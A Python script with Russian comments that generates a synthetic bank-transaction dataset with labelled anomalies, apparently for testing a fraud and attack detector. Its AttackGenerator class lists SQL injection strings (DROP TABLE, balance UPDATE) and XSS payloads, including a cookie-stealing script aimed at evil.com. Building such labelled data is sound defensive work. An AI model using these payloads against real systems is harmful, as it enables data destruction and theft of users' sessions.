#!/usr/bin/env python3
"""
Предгенерация банковских транзакций в JSON файл.
Создаёт датасет с легитимными и аномальными транзакциями.
"""
import json
import random
import uuid
import os
from datetime import datetime, timedelta
from typing import List, Dict
import numpy as np
from scipy import stats
import argparse

# Параметры по умолчанию
NUM_USERS = 100
NUM_TRANSACTIONS = 30000
SIMULATION_HOURS = 24
OUTPUT_DIR = "data/transactions"


class AnomalyType:
    NORMAL = 0
    SQL_INJECTION = 1
    XSS = 2
    FRAUD_VELOCITY = 3
    FRAUD_AMOUNT = 4
    FRAUD_GEO = 5
    FRAUD_TIME = 6
    DDOS = 7
    BRUTE_FORCE = 8


class DistributionType:
    POISSON = "poisson"
    PARETO = "pareto"
    EXPONENTIAL = "exponential"
    NORMAL = "normal"
    
    @classmethod
    def all(cls) -> List[str]:
        return [cls.POISSON, cls.PARETO, cls.EXPONENTIAL]


class User:
    def __init__(self, user_id: str, name: str, account_number: str, 
                 balance: float, risk_score: float, typical_amount_mean: float,
                 typical_amount_std: float, active_hours: tuple):
        self.user_id = user_id
        self.name = name
        self.account_number = account_number
        self.balance = balance
        self.risk_score = risk_score
        self.typical_amount_mean = typical_amount_mean
        self.typical_amount_std = typical_amount_std
        self.active_hours = active_hours
    
    def to_dict(self) -> Dict:
        return {
            "user_id": self.user_id,
            "name": self.name,
            "account_number": self.account_number,
            "balance": self.balance,
            "risk_score": self.risk_score,
            "typical_amount_mean": self.typical_amount_mean,
            "typical_amount_std": self.typical_amount_std,
            "active_hours": list(self.active_hours)
        }


class UserGenerator:
    FIRST_NAMES = ["Иван", "Петр", "Алексей", "Мария", "Елена", "Ольга", 
                   "Дмитрий", "Анна", "Сергей", "Наталья"]
    LAST_NAMES = ["Иванов", "Петров", "Сидоров", "Козлов", "Новиков", 
                  "Морозов", "Волков", "Соколов", "Лебедев", "Кузнецов"]
    
    @staticmethod
    def generate_users(count: int) -> List[User]:
        users = []
        for i in range(count):
            name = f"{random.choice(UserGenerator.FIRST_NAMES)} {random.choice(UserGenerator.LAST_NAMES)}"
            users.append(User(
                user_id=f"USR-{i+1:05d}",
                name=name,
                account_number=f"4081781000{random.randint(10000000, 99999999)}",
                balance=random.uniform(10000, 5000000),
                risk_score=random.betavariate(2, 8),
                typical_amount_mean=random.uniform(1000, 50000),
                typical_amount_std=random.uniform(500, 10000),
                active_hours=(random.randint(8, 10), random.randint(18, 22))
            ))
        return users


class TransactionDistribution:
    @staticmethod
    def daily_activity_distribution(hour: int) -> float:
        """Гауссово распределение активности в течение дня"""
        primary = stats.norm.pdf(hour, loc=13, scale=2.5)
        secondary = stats.norm.pdf(hour, loc=19, scale=2) * 0.6
        morning = stats.norm.pdf(hour, loc=10, scale=1.5) * 0.4
        return primary + secondary + morning
    
    @staticmethod
    def generate_transaction_times(num_transactions: int, base_date: datetime) -> List[datetime]:
        """Генерация времени транзакций по нормальному распределению"""
        times = []
        hour_weights = [TransactionDistribution.daily_activity_distribution(h) for h in range(24)]
        total_weight = sum(hour_weights)
        hour_probs = [w / total_weight for w in hour_weights]
        
        for _ in range(num_transactions):
            hour = np.random.choice(24, p=hour_probs)
            tx_time = base_date.replace(
                hour=hour,
                minute=random.randint(0, 59),
                second=random.randint(0, 59),
                microsecond=random.randint(0, 999999)
            )
            times.append(tx_time)
        return sorted(times)
    
    @staticmethod
    def generate_anomaly_time(base_date: datetime, duration_hours: int, distribution: str) -> datetime:
        """Генерация времени аномалии по заданному распределению"""
        if distribution == DistributionType.POISSON:
            seconds = random.uniform(0, duration_hours * 3600)
        elif distribution == DistributionType.EXPONENTIAL:
            scale = duration_hours * 3600 / 3
            seconds = min(np.random.exponential(scale), duration_hours * 3600 - 1)
        elif distribution == DistributionType.PARETO:
            pareto_val = (np.random.pareto(1.5) + 1)
            seconds = min(pareto_val * 1000, duration_hours * 3600 - 1)
        else:
            seconds = random.uniform(0, duration_hours * 3600)
        return base_date + timedelta(seconds=seconds)


class AttackGenerator:
    SQL_INJECTIONS = [
        "' OR '1'='1' --",
        "'; DROP TABLE transactions; --",
        "' UNION SELECT * FROM users --",
        "1; UPDATE accounts SET balance=999999 WHERE user_id='",
        "' AND 1=1 UNION SELECT password FROM users --"
    ]
    
    XSS_PAYLOADS = [
        "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert(document.domain)"
    ]
    
    @staticmethod
    def generate_sql_injection(transaction: Dict) -> Dict:
        transaction["description"] = random.choice(AttackGenerator.SQL_INJECTIONS)
        transaction["attack_type"] = "sql_injection"
        transaction["anomaly_code"] = AnomalyType.SQL_INJECTION
        transaction["is_malicious"] = True
        return transaction
    
    @staticmethod
    def generate_xss(transaction: Dict) -> Dict:
        transaction["description"] = random.choice(AttackGenerator.XSS_PAYLOADS)
        transaction["attack_type"] = "xss"
        transaction["anomaly_code"] = AnomalyType.XSS
        transaction["is_malicious"] = True
        return transaction
    
    @staticmethod
    def generate_fraud(transaction: Dict, fraud_type: str) -> Dict:
        if fraud_type == "velocity":
            transaction["amount"] = random.uniform(100, 500)
            transaction["anomaly_code"] = AnomalyType.FRAUD_VELOCITY
        elif fraud_type == "amount_anomaly":
            transaction["amount"] = random.uniform(500000, 5000000)
            transaction["anomaly_code"] = AnomalyType.FRAUD_AMOUNT
        elif fraud_type == "geo_anomaly":
            transaction["location"] = {"country": "NG", "city": "Lagos", "ip": "197.210.0.1"}
            transaction["anomaly_code"] = AnomalyType.FRAUD_GEO
        elif fraud_type == "time_anomaly":
            transaction["anomaly_code"] = AnomalyType.FRAUD_TIME
        
        transaction["attack_type"] = f"fraud_{fraud_type}"
        transaction["is_malicious"] = True
        return transaction


class TransactionGenerator:
    def __init__(self, num_users: int, num_transactions: int, anomaly_ratio: float = 0.15):
        self.num_users = num_users
        self.num_transactions = num_transactions
        self.anomaly_ratio = anomaly_ratio
        self.users = UserGenerator.generate_users(num_users)
        self.session_id = f"GEN-{datetime.utcnow().strftime('%Y%m%d%H%M%S')}"
    
    def generate_normal_transaction(self, user: User, receiver: User, timestamp: datetime) -> Dict:
        amount = max(100, np.random.normal(user.typical_amount_mean, user.typical_amount_std))
        return {
            "transaction_id": f"TXN-{uuid.uuid4().hex[:12].upper()}",
            "user_id": user.user_id,
            "sender_account": user.account_number,
            "receiver_account": receiver.account_number,
            "amount": round(amount, 2),
            "currency": "RUB",
            "timestamp": timestamp.isoformat(),
            "transaction_type": random.choice(["transfer", "payment", "withdrawal"]),
            "description": random.choice([
                "Перевод другу", "Оплата услуг", "Покупка товара",
                "Коммунальные платежи", "Пополнение счета", "Возврат долга"
            ]),
            "ip_address": f"192.168.{random.randint(1,254)}.{random.randint(1,254)}",
            "device_fingerprint": uuid.uuid4().hex,
            "location": {
                "country": "RU",
                "city": random.choice(["Москва", "СПб", "Казань", "Новосибирск"])
            },
            "is_malicious": False,
            "attack_type": "normal",
            "anomaly_code": AnomalyType.NORMAL,
            "distribution": DistributionType.NORMAL
        }
    
    def generate_all(self) -> Dict:
        """Генерирует все транзакции и возвращает полный датасет"""
        print(f"Генерация {self.num_transactions} транзакций для {self.num_users} пользователей...")
        
        base_date = datetime.utcnow().replace(hour=0, minute=0, second=0, microsecond=0)
        
        # Разделение на легитимные и аномальные
        normal_count = int(self.num_transactions * (1 - self.anomaly_ratio))
        anomaly_count = self.num_transactions - normal_count
        
        transactions = []
        stats = {
            "total": self.num_transactions,
            "normal": normal_count,
            "anomalies": anomaly_count,
            "by_distribution": {d: 0 for d in DistributionType.all() + [DistributionType.NORMAL]},
            "by_attack_type": {},
            "by_hour": {h: {"normal": 0, "anomaly": 0} for h in range(24)}
        }
        
        # Генерация легитимных транзакций (нормальное распределение по времени)
        print(f"  Генерация {normal_count} легитимных транзакций...")
        normal_times = TransactionDistribution.generate_transaction_times(normal_count, base_date)
        
        for tx_time in normal_times:
            user = random.choice(self.users)
            receiver = random.choice([u for u in self.users if u.user_id != user.user_id])
            tx = self.generate_normal_transaction(user, receiver, tx_time)
            transactions.append(tx)
            stats["by_distribution"][DistributionType.NORMAL] += 1
            stats["by_hour"][tx_time.hour]["normal"] += 1
        
        # Генерация аномальных транзакций
        print(f"  Генерация {anomaly_count} аномальных транзакций...")
        attack_types = ["sql_injection", "xss", "fraud_velocity", "fraud_amount_anomaly", "fraud_geo_anomaly"]
        distributions = DistributionType.all()
        
        for _ in range(anomaly_count):
            user = random.choice(self.users)
            receiver = random.choice([u for u in self.users if u.user_id != user.user_id])
            distribution = random.choice(distributions)
            attack_time = TransactionDistribution.generate_anomaly_time(base_date, SIMULATION_HOURS, distribution)
            
            tx = self.generate_normal_transaction(user, receiver, attack_time)
            tx["distribution"] = distribution
            
            attack_type = random.choice(attack_types)
            if attack_type == "sql_injection":
                tx = AttackGenerator.generate_sql_injection(tx)
            elif attack_type == "xss":
                tx = AttackGenerator.generate_xss(tx)
            elif attack_type.startswith("fraud_"):
                tx = AttackGenerator.generate_fraud(tx, attack_type.replace("fraud_", ""))
            
            transactions.append(tx)
            stats["by_distribution"][distribution] += 1
            stats["by_hour"][attack_time.hour]["anomaly"] += 1
            
            if attack_type not in stats["by_attack_type"]:
                stats["by_attack_type"][attack_type] = 0
            stats["by_attack_type"][attack_type] += 1
        
        # Сортировка по времени
        transactions.sort(key=lambda x: x["timestamp"])
        
        return {
            "metadata": {
                "session_id": self.session_id,
                "generated_at": datetime.utcnow().isoformat(),
                "num_users": self.num_users,
                "num_transactions": len(transactions),
                "anomaly_ratio": self.anomaly_ratio,
                "simulation_hours": SIMULATION_HOURS
            },
            "statistics": stats,
            "users": [u.to_dict() for u in self.users],
            "transactions": transactions
        }


def save_dataset(dataset: Dict, output_dir: str, filename: str = None) -> str:
    """Сохраняет датасет в JSON файл"""
    os.makedirs(output_dir, exist_ok=True)
    
    if filename is None:
        filename = f"transactions_{dataset['metadata']['session_id']}.json"
    
    filepath = os.path.join(output_dir, filename)
    
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(dataset, f, ensure_ascii=False, indent=2)
    
    return filepath


def print_stats(dataset: Dict):
    """Выводит статистику датасета"""
    meta = dataset["metadata"]
    stats = dataset["statistics"]
    
    print(f"\n{'='*60}")
    print(f"ДАТАСЕТ ТРАНЗАКЦИЙ СГЕНЕРИРОВАН")
    print(f"{'='*60}")
    print(f"Session ID: {meta['session_id']}")
    print(f"Пользователей: {meta['num_users']}")
    print(f"Транзакций: {meta['num_transactions']}")
    print(f"Доля аномалий: {meta['anomaly_ratio']*100:.1f}%")
    
    print(f"\n--- По распределениям ---")
    for dist, count in stats["by_distribution"].items():
        if count > 0:
            print(f"  {dist}: {count}")
    
    print(f"\n--- По типам атак ---")
    for attack, count in stats["by_attack_type"].items():
        print(f"  {attack}: {count}")
    
    print(f"\n--- Почасовое распределение ---")
    max_total = max(h["normal"] + h["anomaly"] for h in stats["by_hour"].values())
    for hour in range(24):
        data = stats["by_hour"][hour]
        total = data["normal"] + data["anomaly"]
        bar_len = int(total / max(max_total, 1) * 30)
        print(f"  {hour:02d}:00 | {'█' * bar_len} {total} (норм: {data['normal']}, аном: {data['anomaly']})")
    
    print(f"{'='*60}")


def main():
    parser = argparse.ArgumentParser(description="Генератор банковских транзакций")
    parser.add_argument("--users", type=int, default=NUM_USERS, help="Количество пользователей")
    parser.add_argument("--transactions", type=int, default=NUM_TRANSACTIONS, help="Количество транзакций")
    parser.add_argument("--anomaly-ratio", type=float, default=0.15, help="Доля аномалий (0-1)")
    parser.add_argument("--output", type=str, default=OUTPUT_DIR, help="Директория для сохранения")
    parser.add_argument("--filename", type=str, default=None, help="Имя файла (опционально)")
    args = parser.parse_args()
    
    generator = TransactionGenerator(
        num_users=args.users,
        num_transactions=args.transactions,
        anomaly_ratio=args.anomaly_ratio
    )
    
    dataset = generator.generate_all()
    filepath = save_dataset(dataset, args.output, args.filename)
    
    print_stats(dataset)
    print(f"\n✅ Датасет сохранён: {filepath}")
    print(f"\nДля запуска симуляции:")
    print(f"  python run_bank_simulation.py --input {filepath}")


if __name__ == "__main__":
    main()
